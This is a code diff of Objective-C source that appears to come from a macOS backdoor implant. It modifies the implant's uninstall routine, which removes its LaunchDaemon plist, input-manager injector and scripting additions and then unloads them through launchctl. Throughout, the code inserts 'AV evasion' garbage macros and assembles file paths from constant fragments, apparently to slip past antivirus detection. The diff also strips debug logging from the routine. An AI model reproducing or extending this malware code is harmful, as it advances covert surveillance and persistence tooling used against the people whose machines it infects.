@@ -448,13 +448,6 @@ static NSLock *gSyncLock                  = nil;
   [gControlFlagLock unlock];
   
   // AV evasion: only on release build
-  AV_GARBAGE_002
-  
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Action Uninstall started!");
-#endif
-  
-  // AV evasion: only on release build
   AV_GARBAGE_003
   
   BOOL lckRet = NO;
@@ -467,11 +460,6 @@ static NSLock *gSyncLock                  = nil;
   if (lckRet == NO) 
     {
       verboseLog(@"enter critical session with timeout [euid/uid %d/%d]", 
-                 geteuid(), getuid());
-    }
-  else
-    {
-      verboseLog(@"enter critical session normaly [euid/uid %d/%d]", 
                  geteuid(), getuid());
     }
 #endif
@@ -507,44 +495,26 @@ static NSLock *gSyncLock                  = nil;
       errorLog(@"Error while stopping agents");
 #endif
     }
-  else
-    {
-#ifdef DEBUG_TASK_MANAGER
-      infoLog(@"Agents stopped correctly");
-#endif
-    }
-
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Closing active logs");
-#endif
-  
+                    
   // AV evasion: only on release build
   AV_GARBAGE_005
   
   __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
+ 
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if ([_logManager closeActiveLogsAndContinueLogging: NO])
     {
 #ifdef DEBUF
       infoLog(@"Active logs closed correctly");
 #endif
     }
-  else
-    {
-#ifdef DEBUG_TASK_MANAGER
-      errorLog(@"An error occurred while closing active logs");
-#endif
-    }
   
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                             [[[[[NSBundle mainBundle] bundlePath]
-                                stringByDeletingLastPathComponent]
-                               stringByDeletingLastPathComponent]
-                              stringByDeletingLastPathComponent],
-                             BACKDOOR_DAEMON_PLIST];
-
+  NSString *backdoorPlist = createLaunchdPlistPath();
   //
   // Remove the LaunchDaemon plist
   //
@@ -603,8 +573,7 @@ static NSLock *gSyncLock                  = nil;
               AV_GARBAGE_003
               
               destDir = [[NSString alloc]
-                initWithFormat: @"/Library/InputManagers/%@",
-                EXT_BUNDLE_FOLDER];
+                initWithFormat: @"/%@/%@/%@", LIBRARY_NSSTRING, IM_FOLDER, IM_NAME];
               
               // AV evasion: only on release build
               AV_GARBAGE_004
@@ -627,8 +596,10 @@ static NSLock *gSyncLock                  = nil;
             AV_GARBAGE_002
             
               // is Snow Leopard
-              osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
-                           OSAX_ROOT_PATH];
+              osaxRootPath = [[NSString alloc] initWithFormat:@"/%@/%@/%@", 
+                                                              LIBRARY_NSSTRING, 
+                                                              OSAX_FOLDER, 
+                                                              OSAX_NAME];
 //XXX- for av problem
 //              if ([gUtil isLion])
 //                {
@@ -656,16 +627,11 @@ static NSLock *gSyncLock                  = nil;
         }
       else
         {
-#ifdef DEBUG_TASK_MANAGER
-          errorLog(@"I don't have privileges for removing the input manager :(");
-          errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-#endif  
           // AV evasion: only on release build
           AV_GARBAGE_004
           
-          osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
-                       NSUserName(),
-                       OSAX_ROOT_PATH];
+          osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@/%@",
+                       NSUserName(), LIBRARY_NSSTRING, OSAX_FOLDER, OSAX_NAME];
         }
       
       // AV evasion: only on release build
@@ -676,41 +642,15 @@ static NSLock *gSyncLock                  = nil;
         {  
           // AV evasion: only on release build
           AV_GARBAGE_005
-        
-
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Removing scripting additions");
-#endif
-          destDir = [[NSString alloc]
-            initWithFormat: @"%@/%@",
-            osaxRootPath,
-            EXT_BUNDLE_FOLDER];
+          
+          [[NSFileManager defaultManager] removeItemAtPath: osaxRootPath
+                                                     error: &err];
           
           // AV evasion: only on release build
-          AV_GARBAGE_000
-          
-          if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                          error: &err])
-            {
-#ifdef DEBUG_TASK_MANAGER
-              errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-              errorLog(@"Error while removing the osax");
-              errorLog(@"error: %@", [err localizedDescription]);
-#endif
-            }
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_005
-          
-          [destDir release];
+          AV_GARBAGE_004
+          [osaxRootPath release];
         }
-
-    }
-  else
-    {
-#ifdef DEBUG_TASK_MANAGER
-      warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
-#endif
+      
     }
 
 #ifdef DEBUG_TASK_MANAGER
@@ -753,11 +693,6 @@ static NSLock *gSyncLock                  = nil;
   
   // AV evasion: only on release build
   AV_GARBAGE_001
-  
-  // Unregister uspace component
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Unregistering uspace components");
-#endif
 
 #ifndef NO_KEXT
   close(kextFD);
@@ -774,6 +709,7 @@ static NSLock *gSyncLock                  = nil;
                              [[backdoorPlist lastPathComponent]
                               stringByDeletingPathExtension],
                              nil];
+  
   [gUtil executeTask: @"/bin/launchctl"
        withArguments: _commArguments
         waitUntilEnd: YES];
